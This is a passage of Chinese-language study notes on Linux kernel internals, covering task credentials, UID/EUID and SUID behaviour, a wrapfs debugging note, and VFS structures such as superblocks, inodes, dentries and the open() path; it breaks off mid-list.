<p>这些是Task特有的credentials。他们代表了更加高级的权限以细粒度分发给原本不会有这些权限的Task。他们被隐式的通过传统的UNIX credentials操作，但是也可以显式的直接使用<code>capset</code>系统调用操作。</p>
<p>The permitted capabilities are those caps that the process might grant itself to its effective or permitted sets through <code>capset()</code>. This inheritable set might also be so constrained.</p>
<p>The effective capabilities are the ones that a task is actually allowed to make use of itself.</p>
<p>The inheritable capabilities are the ones that may get passed across <code>execve()</code>.</p>
<p>The bounding set limits the capabilities that may be inherited across <code>execve()</code>, especially when a binary is executed that will execute as UID 0.</p>
</li>
<li>
<p>Secure management flags (securebits)</p>
<p>这些是Task特有的credentials。</p>
</li>
<li>
<p>Keys and keyrings</p>
<p>这些是Task特有的credentials。</p>
</li>
<li>
<p>LSM</p>
</li>
<li>
<p>AF_KEY</p>
</li>
</ol>
<h2 id="file-marking"><a class="header" href="#file-marking">File marking</a></h2>
<p>在硬盘或者网络上的文件可能有一些annotations(注释),来构成文件的objective security context。取决于文件系统的类型，他可能包括：</p>
<ul>
<li>UNIX UID, GID, mode</li>
<li>Windows user ID</li>
<li>Access control list</li>
<li>LSM security label</li>
<li>UNIX exec previlege escalation bits (SUID/SGID)</li>
<li>File capabilities exec privilege escalation bits</li>
</ul>
<p>通过将这些信息和task的subjective security context进行对比，一些操作可能会被允许或禁止执行。比如当我们试图执行<code>execve()</code>的时候，文件的escalation bits就很重要，他可能允许process拥有一些额外的权限。</p>
<h2 id="task-credentials"><a class="header" href="#task-credentials">Task credentials</a></h2>
<p>在Linux中，每个task的credential都直接保存(uid,gid)或通过一个引用计数结构(groups,keys,LSM security)保存在<code>struct cred</code>中。每个进程通过一个叫做<code>cred</code>的指针指向自己的credentials。</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L1029">5.16.1, /include/linux/sche.h</a>源代码参考</p>
<pre><code class="language-c">struct task_struct {
    ...
    /* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
    ...
}
</code></pre>
<p>一旦一组credentials准备好并且提交后，就不能在改变了，除了以下例外：</p>
<ol>
<li>its reference count may be changed;</li>
<li>the reference count on the group_info struct it points to may be changed;</li>
<li>the reference count on the security data it points to may be changed;</li>
<li>the reference count on any keyrings it points to may be changed;</li>
<li>any keyrings it points to may be revoked, expired or have their security attributes changed; and</li>
<li>the contents of any keyrings to which it points may be changed (the whole point of keyrings being a shared set of credentials, modifiable by anyone with appropriate access).</li>
</ol>
<p>任何<code>struct cred</code>中项目的改变，我们都需要遵循copy-and-replace原则。先做一个copy，然后改变copy，在使用RCU去修改原来的<code>cred</code>指针让他指向新的copy。</p>
<p>一个Task只能改变他自己的credentials，不再允许一个task修改其他task的credentials，这就意味着<code>capset()</code>系统调用不再允许接受除了自己进程以外的PID。Also <code>keyctl_instantiate()</code> and <code>keyctl_negate()</code> functions no longer permit attachment to process-specific keyrings in the requesting process as the instantiating process may need to create them.</p>
<h3 id="immutable-credentials"><a class="header" href="#immutable-credentials">Immutable Credentials</a></h3>
<p>一旦一组credentials被变成公开的（比如用过<code>commit_creds()</code>），他就必须被视为不可变的，除了以下两个例外：</p>
<ol>
<li>The reference count may be altered.</li>
<li>While the keyring subscriptions of a set of credentials may not be changed, the keyrings subscribed to may have their contents altered.</li>
</ol>
<p>为了抓住不小心的对credentials的修改，<code>struct task_struct</code>使用了const指针来指向credential集合，<code>struct file</code>也是这么做的。另外，特定的函数比如<code>get_cred()</code>和<code>put_cred()</code>操作的是const指针，所以不需要做类型转换，但是需要临时的摆脱const的限制从而可以去修改reference count。</p>
<h3 id="accessing-task-credentials"><a class="header" href="#accessing-task-credentials">Accessing Task Credentials</a></h3>
<h2 id="open-file-credentials"><a class="header" href="#open-file-credentials">Open file credentials</a></h2>
<h2 id="overriding-the-cfss-use-of-credentials"><a class="header" href="#overriding-the-cfss-use-of-credentials">Overriding the cfs’s use of credentials</a></h2>
<hr />
<h2 id="uid"><a class="header" href="#uid">UID</a></h2>
<p>https://www.kernel.org/doc/html/latest/filesystems/api-summary.html </p>
<ul>
<li>UID（User identifier，用户ID），在类UNIX系统中是内核用来<strong>辨识用户</strong>的一个<strong>无符号整型数值</strong>，亦是UNIX文件系统与进程的必要组成部分之一。</li>
<li>GID（Group identifier，组ID）。</li>
</ul>
<p>Linux的<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110">struct cred</a>中相关结构如下：</p>
<pre><code class="language-c">struct cred {
    ...
    kuid_t		uid;		/* real UID of the task */
    kgid_t		gid;		/* real GID of the task */
    kuid_t		suid;		/* saved UID of the task */
    kgid_t		sgid;		/* saved GID of the task */
    kuid_t		euid;		/* effective UID of the task */
    kgid_t		egid;		/* effective GID of the task */
    kuid_t		fsuid;		/* UID for VFS ops */
    kgid_t		fsgid;		/* GID for VFS ops */
    ...
}
</code></pre>
<ul>
<li>UID：用来标识用户身份，real user id。</li>
<li>EUID：有效，effective user id。一般来说，进程权限的检查都取决于euid。</li>
<li>SUID：</li>
</ul>
<p>另外，task_struct中分别有read_cred和cred两个条目，分别代表进程作为object和subject的credential。</p>
<h3 id="setuidseteuid"><a class="header" href="#setuidseteuid">setuid/seteuid</a></h3>
<blockquote>
<p><code>setuid()</code> sets the effective user ID of the calling process. <code>seteuid()</code> sets the effective user ID of the calling process （描述是一模一样的，都是改变euid）</p>
<p>If the user is root or the program is set-user-ID-root, special care must be taken: setuid() checks the effective user ID of the caller and if it is the superuser, all process-related user ID's are set to uid.  After this has occurred, it is impossible for the program to regain root privileges.</p>
<p>Thus, a set-user-ID-root program wishing to temporarily drop root privileges, assume the identity of an unprivileged user, and then regain root privileges afterward cannot use setuid().  You can accomplish this with seteuid(2). （所以，可以认为seteuid可以临时放弃root权限，setuid会永久放弃root权限	）</p>
</blockquote>
<p>suid需要和可执行文件配合使用。</p>
<blockquote>
<p>Commonly noted as <strong>SUID</strong>, the special permission for the user access level has a single function: A file with <strong>SUID</strong> always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase <strong>S</strong> here.</p>
</blockquote>
<p>用户可以修改自己的账号密码，也就是说用户有权限修改<code>/etc/passwd</code>？并不是，root才有权限修改这个文件。所以，用户在执行<code>/usr/bin/passwd</code>的时候暂时拥有了root权限。</p>
<pre><code>-rwsr-xr-x 1 root root 68208 7月  15  2021 /usr/bin/passwd
</code></pre>
<p>https://www.redhat.com/sysadmin/suid-sgid-sticky-bit</p>
<p>一个小实验。编译下面的文件，<code>chmod +s a.out</code>，执行可以发现<code>euid=0</code>，即root。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main() {
        uid_t uid,euid;

        uid = getuid();
        euid = geteuid();

        printf(&quot;uid = %d, euid = %d\n&quot;, uid, euid);
        return 0;
}
</code></pre>
<h2 id="namespace"><a class="header" href="#namespace">Namespace</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="debug笔记"><a class="header" href="#debug笔记">Debug笔记</a></h1>
<h2 id="511"><a class="header" href="#511">5.11</a></h2>
<p>调试wrapfs的时候冒出了这样一个提示：</p>
<pre><code class="language-c">[  444.175922] kernel read not supported for file /guard_cli (pid: 3644 comm: bash)
</code></pre>
<p>这个是内核的<code>warn_unsupported</code>函数打印出来的。（我直接搜索kernel read not supported）啥也找不到，原来read是格式化字符串。</p>
<p>一看，这个东西是kernel_read/kernel_write，或者是do_splice_to/do_splice_from打印出来的，而且有意思的是，只在我试图执行文件的时候才会报错。</p>
<p>在<code>exec</code>控制流里面是有kernel_read的调用的。可能是我们的wrapfs影响了kernel_read的执行？因为5.4正常5.11出错，可以比较两个版本的差异。结果就是完全不一样啊。不过5.11出错的关键在<a href="https://elixir.bootlin.com/linux/v5.16.1/source/fs/read_write.c#L433">这里</a>：</p>
<pre><code class="language-c">/*
 * Also fail if -&gt;read_iter and -&gt;read are both wired up as that
 * implies very convoluted semantics.
 */
if (unlikely(!file-&gt;f_op-&gt;read_iter || file-&gt;f_op-&gt;read))
    return warn_unsupported(file, &quot;read&quot;);
</code></pre>
<p>这个逻辑很有意思，要求有read_iter，并且没有read方法。<a href="https://lkml.org/lkml/2020/9/3/555">原始修改的记录</a>上说</p>
<blockquote>
<p>Don't allow calling -&gt;read or -&gt;write with set_fs as a preparation for killing off set_fs.  All the instances that we use kernel_read/write on are using the iter ops already.</p>
<p>If a file has both the regular -&gt;read/-&gt;write methods and the iter variants those could have different semantics for messed up enough drivers.  Also fails the kernel access to them in that case.</p>
</blockquote>
<p>看了一下，居然<a href="https://elixir.bootlin.com/linux/v5.11.22/source/fs/ext4/file.c#L913">ext4</a>还真的没有提供read方法，只提供了read方法。</p>
<h2 id="415"><a class="header" href="#415">4.15</a></h2>
<p>check_permission好像有问题。</p>
<p>权限检查也有问题。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-system"><a class="header" href="#file-system">File System</a></h1>
<p>这篇文章的目的是以Loadable Kernel Module的形式装载一个File System</p>
<ol>
<li>
<p>编写一个file system kernel module </p>
</li>
<li>
<p>载入module</p>
<pre><code class="language-sh">insmod myfs
</code></pre>
</li>
<li>
<p>把你想要hook file system的目录挂载到你自己的file system </p>
<pre><code class="language-sh">mount -t myfs /some/lower/path /mnt/wrapfs
</code></pre>
</li>
</ol>
<h2 id="virtual-file-system"><a class="header" href="#virtual-file-system">Virtual File System</a></h2>
<img src="Advanced/Linux/LinuxKernel/../images/v2-b92499b17ed11bc279689ecdb6efb4b6_720w.jpg" alt="img" style="zoom:50%;" />
<p>关于VFS，有一篇<a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html#struct-file-system-type">不错的介绍</a>。这是2.6.39的代码，很简洁</p>
<pre><code class="language-c">struct file_system_type {
        const char *name;
        int fs_flags;
        struct dentry *(*mount) (struct file_system_type *, int,
                                 const char *, void *);
        void (*kill_sb) (struct super_block *);
        struct module *owner;
        struct file_system_type * next;
        struct list_head fs_supers;
        struct lock_class_key s_lock_key;
        struct lock_class_key s_umount_key;
};
</code></pre>
<h3 id="virtual-file-system-data-structure"><a class="header" href="#virtual-file-system-data-structure">Virtual File System Data Structure</a></h3>
<p>被称为文件系统的四大数据结构。无论底层的真实文件系统中是否有这些数据结构，在VFS中都会有对应的数据结构。</p>
<p><img src="Advanced/Linux/LinuxKernel/../images/v2-1f4c58110d5c486d463308e01cb2b265_1440w.jpg" alt="img" /></p>
<p>超级块(<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fs.h#L1465">struct super_block</a>)代表了整个文件系统，超级块是文件系统的控制块，有整个文件系统信息，一个文件系统所有的inode都要连接到超级块上，可以说，<strong>一个超级块就代表了一个文件系统</strong>。	</p>
<pre><code class="language-c">// 这个list上边的就是所有的在linux上记录的文件系统
struct list_head    s_list;		
// 挂载点
struct dentry		*s_root;
// 文件系统类型 也就是当前这个文件系统属于哪个类型 ext4/fat32
// 一个文件系统类型下可以包括很多文件系统即很多的super_block
struct file_system_type	*s_type;
// Filesystem private info 也就是说你可以在这里存一些你想要的自定义的东西
void			*s_fs_info;	
</code></pre>
<p>Inode(<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fs.h#L623">struct inode</a>)保存的其实是实际的数据的一些信息，这些信息称为“元数据”(也就是对文件属性的描述)。例如：文件大小，设备标识符，用户标识符，用户组标识符，文件模式，扩展属性，文件读取或修改的时间戳，链接数量，指向存储该内容的磁盘区块的指针，文件分类等等。</p>
<pre><code class="language-c">// 这个就是我们平时看到的drwxrwxr-x的数据
umode_t            i_mode;
// 
union {
    struct hlist_head	i_dentry;
    struct rcu_head		i_rcu;
};
struct super_block	*i_sb;
// 这就是 inode numebr
unsigned long		i_ino;
// fs or device private pointer 也就是说你可以在这里存一些你想要的自定义的东西
void			*i_private; 
struct address_space	*i_mapping;
struct address_space	i_data;
</code></pre>
<p>目录项(<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/dcache.h#L91">struct dentry</a>)：目录项是<strong>描述文件</strong>的逻辑属性，只存在于内存中，并没有实际对应的磁盘上的描述，更确切的说是存在于内存的目录项缓存，为了提高查找性能而设计。注意<strong>不管是文件夹还是最终的文件</strong>，都是属于目录项，所有的目录项在一起构成一颗庞大的目录树。例如：open一个文件/home/xxx/yyy.txt，那么/、home、xxx、yyy.txt都是一个目录项，VFS在查找的时候，根据一层一层的目录项找到对应的每个目录项的inode，那么沿着目录项进行操作就可以找到最终的文件。</p>
<pre><code class="language-c">// small names 文件的名字，还有一个结构是d_name里面有一个指针指向了d_iname
unsigned char d_iname[DNAME_INLINE_LEN];	
// Where the name belongs to
struct inode *d_inode;	
// 对应的super_block
struct super_block *d_sb;	
// fs-specific data 也就是说你可以在这里存一些你想要的自定义的东西
void *d_fsdata;			
// 下面三个entry可以构成一个树形结构 
// list_head是一个双向链表,指向的是其他d_entry对应的list_head entry，然后再用hack的宏完成指向真正的d_entry
// (struct dentry*)((char *)me-&gt;d_child.head -(char *)&amp;((struct dentry *)0)-&gt;d_child))
// 对于非目录文件，d_subdirs 就指向他自己（这个entry）
struct dentry *d_parent;	/* parent directory 父 */
struct list_head d_child;	/* child of parent list 兄 */ 
struct list_head d_subdirs;	/* our children 子 */
</code></pre>
<p>文件对象(<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fs.h#L965">struct file</a>)：注意文件对象描述的是进程已经打开的文件。因为一个文件可以被多个进程打开，所以一个文件可以存在多个文件对象。但是由于文件是唯一的，那么inode就是唯一的，目录项也是定的。<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/path.h#L8">struct path</a></p>
<pre><code class="language-c">// path是一个简单的结构体，里面有两项，其中一项就是dentry
struct path		f_path;
struct inode	*f_inode;	/* cached value */
// 一些flag规定文件的可读、可写、可执行权限
fmode_t			f_mode;
const struct file_operations	*f_op;
struct address_space	*f_mapping;
// 你可以在这里存一些你想要的自定义的东西
void			*private_data;
</code></pre>
<p>关于他们之间的转换：</p>
<ul>
<li>inode -&gt; dentry: 利用<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/list.h#L994"><code>hlist_for_each_entry</code></a>宏遍历<code>i_dentry</code>字段，可以参考Linux中的<a href="https://elixir.bootlin.com/linux/latest/source/fs/dcache.c#L666">一个例子</a>。</li>
<li>dentry -&gt; inode: 利用<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/dcache.h#L303"><code>d_inode</code></a>函数，或者直接使用<code>d_inode</code>字段。</li>
<li>path -&gt; dentry: 利用<code>dentry</code>字段。</li>
<li>dentry -&gt; char *路径: 利用<a href="https://elixir.bootlin.com/linux/latest/source/fs/d_path.c#L371"><code>dentry_path</code></a>函数。</li>
<li>path -&gt; char *路径: 利用<a href="https://elixir.bootlin.com/linux/latest/source/fs/d_path.c#L264"><code>d_path</code></a>函数。</li>
<li>char *路径 -&gt; path: 利用kern_path函数。</li>
<li>superblock -&gt; inode: <a href="https://elixir.bootlin.com/linux/v4.20.17/source/fs/inode.c#L1137"><code>iget_locked</code></a>或者<a href="https://elixir.bootlin.com/linux/v4.20.17/source/fs/inode.c#L1097"><code>iget5_locked</code></a>。</li>
</ul>
<h3 id="virtual-file-system-operation"><a class="header" href="#virtual-file-system-operation">Virtual File System Operation</a></h3>
<p>虚拟文件系统是类似于Trait一样的东西，肯定是要暴露一些接口供真正的实现。在C语言中就是一堆函数指针，有下面这些方法(这些struct是一大堆方法的集合)</p>
<ul>
<li>
<p>file_system_type -&gt; <code>mount</code>: the method to call when a new instance of this filesystem should be mounted</p>
</li>
<li>
<p>file_system_type -&gt; <code>kill_sb</code>: the method to call when an instance of this filesystem should be shut down</p>
</li>
<li>
<p>super_block -&gt; <code>struct super_operations</code>: This describes how the VFS can manipulate the superblock of your filesystem</p>
<ul>
<li>statfs: </li>
</ul>
</li>
<li>
<p>inode -&gt; <code>struct inode_operations </code>: This describes how the VFS can manipulate an inode in your filesystem. </p>
</li>
<li>
<p>dentry -&gt; <code>struct dentry_operations</code>: This describes how a filesystem can overload the standard dentry operations.</p>
</li>
<li>
<p>file -&gt; <code>struct file_operations</code>: This describes how the VFS can manipulate an open file. </p>
</li>
<li>
<p>address_space -&gt;<code>struct address_space_operations</code>: This describes how the VFS can manipulate mapping of a file to page cache in your filesystem.</p>
</li>
</ul>
<p>所以这些方法都要重写吗？没有默认实现吗？并不是的，有些可以是NULL，表示不需要或者采用默认实现。<a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html#struct-file-system-type">这篇文章</a>提供了很好的参考，不过版本需要注意。</p>
<h3 id="mount"><a class="header" href="#mount">mount</a></h3>
<blockquote>
<p>mount [-t vfstype] [-o options] [设备名称] [挂载点]</p>
</blockquote>
<ul>
<li><code>挂载点</code>: 必须是一个已经存在的目录，这个目录可以不为空，但挂载后这个目录下以前的内容将不可用，umount以后会恢复正常</li>
<li><code>设备名称</code>: 可以是一个分区，一个usb设备，光驱，软盘，网络共享等</li>
<li><code>-t</code> 指定文件系统的类型，通常不必指定。mount 会自动选择正确的类型。常用类型有：</li>
</ul>
<p>从代码实现的角度，挂载的过程就是将代表这个文件系统的&quot;super_block&quot;结构体，加入由之前已经挂载的所有filesystems组成的双向链表中（即<code>s_list</code>）。</p>
<p>同一文件系统可以被挂载到多个mount point，这被称为&quot;bind mount&quot;（多个路径是bind在一起的）：</p>
<blockquote>
<p><strong>mount --bind &lt;old_directory&gt; &lt;new_directory&gt;</strong></p>
</blockquote>
<p>其实这并不难理解，它就像是文件系统层面的一个<strong>symbol link</strong>。</p>
<p>不同的文件系统也可以共用同一个mount point，新挂载的文件系统会<strong>覆盖</strong>掉这个位置之前的文件系统（覆盖，指暂时不可见，并不是把内容覆盖了）。</p>
<h3 id="rootfs"><a class="header" href="#rootfs">rootfs</a></h3>
<p>之前说挂载点必须是一个已存在的目录，所以<code>/</code>是怎么挂载上去的？蛋生鸡鸡生蛋？</p>
<p>rootfs就是所谓的根文件系统。Linux启动时，第一个必须挂载的是根文件系统，若系统不能从指定设备上挂载根文件系统，则系统会出错而退出启动。根文件系统包含系统启动时所必须的目录和关键性的文件</p>
<ol>
<li>init进程的应用程序必须运行在根文件系统上</li>
<li>根文件系统提供了根目录<code>/</code></li>
<li>linux挂载分区时所依赖的信息存放于根文件系统<code>/etc/fstab</code>这个文件中</li>
</ol>
<h3 id="分析inode的生命周期"><a class="header" href="#分析inode的生命周期">分析inode的生命周期</a></h3>
<ul>
<li><code>super_operations-&gt;alloc_inode</code>：this method is called by <code>alloc_inode()</code> to allocate memory for struct inode and initialize it. If this function is not defined, a simple ‘struct inode’ is allocated. Normally alloc_inode will be used to <strong>allocate a larger structure which contains a ‘struct inode’ embedded within it</strong>.</li>
<li>那么，什么地方调用了<code>alloc_inode</code>呢？有三个函数<code>new_inode_pseudo</code>,<code>iget5_locked</code>,<code>iget_locked</code>
<ul>
<li><code>new_inode_pseudo</code>是一个残废的函数，在<code>proc</code>这个仅存在于内存的文件系统中有使用。</li>
<li><code>iget5_locked</code>和<code>iget_locked</code>主要功能都是根据ino在super_block中找inode，不过<code>iget5_locked</code>可以带上回调函数。</li>
<li>研究ext2文件系统。<code>iget_locked</code>被<code>ext2_iget</code>调用。虽然有若干个场景使用了这个函数，我们重点关注的是<a href="https://elixir.bootlin.com/linux/v4.20.17/source/fs/ext2/namei.c#L56"><code>ext2_lookup</code></a>，他试图通过<code>ext2_inode_by_name</code>，通过dentry的路径信息，去寻找ino，然后再去寻找inode。</li>
</ul>
</li>
<li>所以，关键是<code>inode_operations-&gt;lookup</code>函数，这个函数实现了dentry到inode的转变，换句话说就是我们提供一个字符串路径，然后解析成dentry，再去lookup
<ul>
<li>lookup可能会找到已经在内存中的inode，还不在内存中的inode，或者硬盘上也没有的inode？</li>
<li>alloc_inode中会调用<code>inode_init_always</code>中会初始化inode的一些entry，在ext2_iget中会根据硬盘上的inode去初始化inode的一些entry。</li>
</ul>
</li>
<li><code>super_operations-&gt;destroy_inode</code>：this method is called by <code>destroy_inode()</code> to release resources allocated for struct inode. It is only required if <code>-&gt;alloc_inode</code> was defined and simply undoes anything done by <code>-&gt;alloc_inode</code>.</li>
</ul>
<p>归纳一下，路径 -&gt; filename_lookup -&gt; ext4_lookup(在这里会根据文件名查ino) -&gt; ext4_iget -&gt; iget_locked(ino -&gt; inode) -&gt; alloc_inode(分配内存，初始化)</p>
<pre><code>#0  alloc_inode (sb=0xffff888006106800) at fs/inode.c:226
#1  0xffffffff812ebe9e in iget_locked (sb=0xffff888006106800, ino=0x134) at fs/inode.c:1192
#2  0xffffffff81399ee0 in __ext4_iget (sb=0xffff888006106800, ino=0x134, flags=&lt;optimized out&gt;, function=0xffffffff82081c00 &lt;__func__.72414&gt; &quot;ext4_lookup&quot;, line=&lt;optimized out&gt;) at fs/ext4/inode.c:4878
#3  0xffffffff813b2bf7 in ext4_lookup (flags=&lt;optimized out&gt;, dentry=&lt;optimized out&gt;, dir=&lt;optimized out&gt;) at fs/ext4/namei.c:1701
#4  ext4_lookup (dir=0xffff8880066e1a98, dentry=0xffff88800673dd80, flags=&lt;optimized out&gt;) at fs/ext4/namei.c:1676
#5  0xffffffff812d7ee2 in __lookup_slow (name=0xffffc90000393cf0, dir=0xffff8880066d5000, flags=0x1) at fs/namei.c:1664
#6  0xffffffff812d7feb in lookup_slow (name=0xffffc90000393cf0, dir=0xffff8880066d5000, flags=0x1) at fs/namei.c:1681
#7  0xffffffff812d81ea in walk_component (nd=0xffffc90000393ce0, flags=0x0) at fs/namei.c:1801
#8  0xffffffff812d90d0 in lookup_last (nd=&lt;optimized out&gt;) at fs/namei.c:2264
#9  path_lookupat (nd=0xffffc90000393ce0, flags=0x0, path=&lt;optimized out&gt;) at fs/namei.c:2309
#10 0xffffffff812ddb3e in filename_lookup (dfd=&lt;optimized out&gt;, name=0xffff8880075f1000, flags=0x1, path=0xffffc90000393e30, root=&lt;optimized out&gt;) at fs/namei.c:2339
#11 0xffffffff812ddcea in user_path_at_empty (dfd=0xffffff9c, name=&lt;optimized out&gt;, flags=0x1, path=0xffffc90000393e30, empty=&lt;optimized out&gt;) at fs/namei.c:2599
#12 0xffffffff812d033d in user_path_at (path=&lt;optimized out&gt;, flags=&lt;optimized out&gt;, name=&lt;optimized out&gt;, dfd=&lt;optimized out&gt;) at ./include/linux/namei.h:49
#13 vfs_statx (dfd=0xffffff9c, filename=0x555f6ae2e8e0 &quot;local&quot;, flags=0x800, stat=&lt;optimized out&gt;, request_mask=0x7ff) at fs/stat.c:187
#14 0xffffffff812d093e in vfs_stat (stat=&lt;optimized out&gt;, filename=&lt;optimized out&gt;) at ./include/linux/fs.h:3253
#15 __do_sys_newstat (filename=&lt;optimized out&gt;, statbuf=0x7ffd5ddbc3c0) at fs/stat.c:341
#16 0xffffffff812d0996 in __se_sys_newstat (statbuf=&lt;optimized out&gt;, filename=&lt;optimized out&gt;) at fs/stat.c:337
#17 __x64_sys_newstat (regs=&lt;optimized out&gt;) at fs/stat.c:337
#18 0xffffffff81004017 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000393f58) at arch/x86/entry/common.c:290
#19 0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
</code></pre>
<h2 id="内核读写文件"><a class="header" href="#内核读写文件">内核读写文件</a></h2>
<p>Since version 4.14 of Linux kernel, <code>vfs_read</code> and <code>vfs_write</code> functions are <strong>no longer exported</strong> for use in modules. Instead, functions exclusively for kernel's file access are provided:</p>
<pre><code class="language-c"># Read the file from the kernel space.
ssize_t kernel_read(struct file *file, void *buf, size_t count, loff_t *pos);

# Write the file from the kernel space.
ssize_t kernel_write(struct file *file, const void *buf, size_t count,
            loff_t *pos);
</code></pre>
<p>Also, <code>filp_open</code> no longer accepts user-space string, so it can be used for kernel access <strong>directly</strong> (without dance with <code>set_fs</code>).</p>
<p>打开文件，可以参考一个<a href="https://elixir.bootlin.com/linux/v4.20.17/source/drivers/target/target_core_file.c#L134">驱动的例子</a>。</p>
<h2 id="registering-and-mounting-a-filesystem"><a class="header" href="#registering-and-mounting-a-filesystem">Registering and Mounting a Filesystem</a></h2>
<p>这是用于注册file system type的接口。</p>
<pre><code class="language-c">extern int register_filesystem(struct file_system_type *);
extern int unregister_filesystem(struct file_system_type *);
</code></pre>
<p>一般的，我们可以定义一个我们<code>file_system_type</code>然后注册他。虽然它有很多字段，但是看起来下面的字段是必须的，代码来自<a href="https://elixir.bootlin.com/linux/latest/source/fs/ext4/super.c#L116">5.17</a></p>
<pre><code class="language-c">static struct file_system_type ext2_fs_type = {
	.owner		= THIS_MODULE,
	.name		= &quot;ext2&quot;,
	.mount		= ext4_mount,
	.kill_sb	= kill_block_super,
	.fs_flags	= FS_REQUIRES_DEV,
};
</code></pre>
<p>上面我们提到了，<code>mount</code>和<code>kill_sb</code>是“接口”，也就是函数指针。我们应该怎么去实现他们呢？参考一些代码，一般来说，会是简单封装下面几个函数之一，<a href="https://elixir.bootlin.com/linux/latest/source/fs/ext4/super.c#L6511"><code>ext4_mount</code></a>就是对<code>mount_bdev</code>的简单封装。</p>
<pre><code class="language-c">extern struct dentry *mount_bdev(struct file_system_type *fs_type,
	int flags, const char *dev_name, void *data,
	int (*fill_super)(struct super_block *, void *, int));
extern struct dentry *mount_single(struct file_system_type *fs_type,
	int flags, void *data,
	int (*fill_super)(struct super_block *, void *, int));
extern struct dentry *mount_nodev(struct file_system_type *fs_type,
	int flags, void *data,
	int (*fill_super)(struct super_block *, void *, int));
</code></pre>
<p>参照<code>ext4_mount</code>的代码。所以，看起来<code>fill_super</code>函数的实现才是重点所在。</p>
<p>我们之前提到，每个挂载的文件系统和<code>super_block</code>是一一对应的。顾名思义<code>fill_super</code>就是装填<code>super_block</code>。他的三个参数分别是</p>
<ul>
<li><code>struct super_block *sb</code> the superblock structure. The callback must initialize this properly.</li>
<li><code>void *data</code> arbitrary mount options, usually comes as an ASCII string (see “Mount Options” section)</li>
<li><code>int silent</code> whether or not to be silent on error</li>
</ul>
<h2 id="fs_struct和files_struct"><a class="header" href="#fs_struct和files_struct">fs_struct和files_struct</a></h2>
<p>顺带一提，<code>task_struct</code>中有两个结构</p>
<pre><code class="language-c">/* Filesystem information: */
struct fs_struct		*fs;
/* Open file information: */
struct files_struct		*files;
</code></pre>
<p>我们常说的<strong>打开文件表</strong>指的是后者，<code>files_struct -&gt; fdt</code>指向了打开文件表，<code>fdtable -&gt; fd</code>是一个<code>file</code>数组。我们获得的<strong>文件描述符</strong>其实就是这个数组的下标，<code>fd[fd]</code>就是一个<code>file *</code>类型。</p>
<pre><code class="language-c">// include/linux/fdtable.h of linux-2.6.37
struct files_struct {
  /*
   * read mostly part
   */
        atomic_t count;
        struct fdtable __rcu *fdt;
        struct fdtable fdtab;
  /*
   * written part on a separate cache line in SMP
   */
        spinlock_t file_lock ____cacheline_aligned_in_smp;
        int next_fd;
        struct embedded_fd_set close_on_exec_init;
        struct embedded_fd_set open_fds_init;
        struct file __rcu * fd_array[NR_OPEN_DEFAULT];
};

struct fdtable {
        unsigned int max_fds;
        struct file __rcu **fd;      /* current fd array */
        fd_set *close_on_exec;
        fd_set *open_fds;
        struct rcu_head rcu;
        struct fdtable *next;
};
</code></pre>
<p>数据结构示意图如下，转载自知乎的陈硕大佬。</p>
<p><img src="Advanced/Linux/LinuxKernel/../images/v2-d9ef0e73add79e1e8c0330fe9ca30420_720w.jpg" alt="img" /></p>
<p>一个迷惑的点是<code>fdtab</code>和<code>fdt</code>有什么区别？为什么一个结构里有两个表？我看到一个解释是下面这样的，调试的时候发现有时<code>fdt</code>并不指向<code>fdtab</code>，有时确实是一个东西。</p>
<blockquote>
<p>为什么有两个fdtable呢？这是内核的一种优化策略。fdt为指针，而fdtab为普通变量。一般情况下，fdt是指向fdtab的，当需要它的时候，才会真正动态申请内存。因为默认大小的文件表足以应付大多数情况，大多数进程不会打开很多的文件，因此这样就可以避免频繁的内存申请。这也是内核的常用技巧之一。在创建时, 使用普通的变量或者数组，然后让指针指向它，作为默认情况使用。只有当进程使用量超过默认值时，才会动态申请内存。</p>
</blockquote>
<h2 id="分析open系统调用"><a class="header" href="#分析open系统调用">分析open系统调用</a></h2>
<p><code>open</code>, <code>openat</code>, <code>creat</code> 都可以起到打开一个文件的作用。他们是不同的系统调用，不过真正的执行的代码是差不多的，进过一些检查，最后调用<a href="https://elixir.bootlin.com/linux/v5.4.168/source/fs/open.c#L1079"><code>do_sys_open()</code></a>。</p>
<pre><code class="language-c">long do_sys_open(int dfd, const char __user *filename, int flags,
                 umode_t mode);
// dfd: dirfd
// filename
// flags
// mode
</code></pre>
<p>阅读<a href="https://elixir.bootlin.com/linux/v5.4.168/source/fs/open.c#L1079"><code>do_sys_open()</code></a>源代码，执行流程大致如下（先忽略flags）：</p>
<ul>
<li>先调用<code>getname</code>， 主要功能是在使用文件名之前将其拷贝到内核数据区，正常结束时返回内核分配的空间首地址。</li>
<li>在调用<code>get_unused_fd_flags</code>，顾名思义是取得系统中可用的文件描述符fd。</li>
<li>然后是重头戏，<code>struct file *f = do_filp_open(dfd, tmp, &amp;op);</code></li>
<li><code>fd_install</code>，感觉是把<code>f</code>存下来，再把<code>fd</code>和<code>f</code>关联起来。</li>
</ul>
<p>阅读<a href="https://elixir.bootlin.com/linux/v5.4.168/source/fs/namei.c#L3550"><code>do_filp_open()</code></a>源代码。</p>
<ul>
<li><code>set_nameidata</code>: 调用 <code>set_nameidata()</code> 保护当前进程现场信息，<strong><code>nameidata</code>这个结构用来辅助路径查找</strong>。</li>
